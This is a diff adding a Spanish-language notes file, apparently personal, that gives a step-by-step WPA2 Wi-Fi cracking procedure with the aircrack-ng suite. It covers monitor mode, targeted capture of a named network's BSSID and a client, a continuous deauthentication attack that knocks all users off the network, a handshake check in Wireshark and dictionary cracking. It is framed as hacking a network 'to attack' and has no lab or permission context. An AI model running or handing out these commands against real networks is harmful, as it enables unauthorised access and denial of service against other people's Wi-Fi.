@@ -1,0 +1,59 @@
+::::::::::::::::::::::::::::::::::::::::::::::::::::: DESCRIPCION DE COMO FUNCIONA :::::::::::::::::::::::::::::::::
+.Se necesita que alguien se conecte a la red para poder entrar o colarnos, si nadie se conecta no se podra
+.Mientras este operando nadie podra conectarse a esa red es como si mi conexion uzara fuerza bruta
+	por ende a todos que quieran entrar los botara.
+
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+.Reiniciar la interfaz (apagar y prender el wifi)
+sudo ifconfig wlan0 down
+sudo ifconfig wlan0 up
+
+.Si esta en modo managed cuando le damos iwconfig
+	apagamos
+	sudo ifconfig wlan0 down
+
+.Cambiamos a modo monitor:
+	sudo airmon-ng start wlan0
+
+.Verificamos con iwconfig que diga mode:monitor y salga + prefijo mon:
+	wlan0mon
+
+.Interceptamos los paquetes
+	sudo airodump-ng wlan0mon
+	Se deberia poder ver todas las redes wifi en este punto se listaran
+
+.Saldria algo asi, pero el importante es el canal que lista en la parte de arriba:
+	5E:68:49:3B:A6:6A  -40       61        0    0  11  180   WPA2 CCMP   PSK  Zona ganya
+	
+.Cada cannal tiene un grupo de wifi todos estan en diferentes canales, el de la casa y muy cercanos estan 11
+	airodump-ng --channel 11  wlan0mon
+	
+.Tambien podemos ver solo la conexion a la que queremos atacar si distractores
+	airodump-ng -c11 -w Capture-Pat -d 5E:68:49:3B:A6:6A  wlan0mon
+		donde c11 es el canal
+
+.Cuando esta listo para atacar saldra esto, donde notes cuando se complete encontro la contraseña:
+                                                                                                                                                                                              
+ BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes                                                                                                            
+                                                                                                                                                                                              
+ 5E:68:49:3B:A6:6A  30:56:84:0C:8F:37  -27    2e- 1      0      657  
+
+.Realizamos el ataque con BSSID y STATIO:
+	aireplay-ng --deauth 0 -a 5E:68:49:3B:A6:6A -c 30:56:84:0C:8F:37 wlan0mon
+
+.Revisar donde esta tu contraseña,ponemos en consola:
+	wireshark Capture-Pat-04.cap
+		cuando se abra la GUI ponemos en el buscador eapol, si sale algun registro es porque,puede estar ahi la contraseña
+
+.Luego debemos tener un diccionario de claves wifi en un txt y comparar la contraseña.
+	aircrack-ng Capture-Pat-04.cap -w password_hack_pahc.txt
+
+.Listo red hackeada.
+	Si encontro te mostrara la contraseña sino saldra un not found XD jajaja
+
+.Cuando se termine el hackeo para liberar a mi antena wifi, tenemos que salir del modo monitor:
+	sudo airmon-ng stop wlan0mon
+
+	                                                                                                      
+
+	
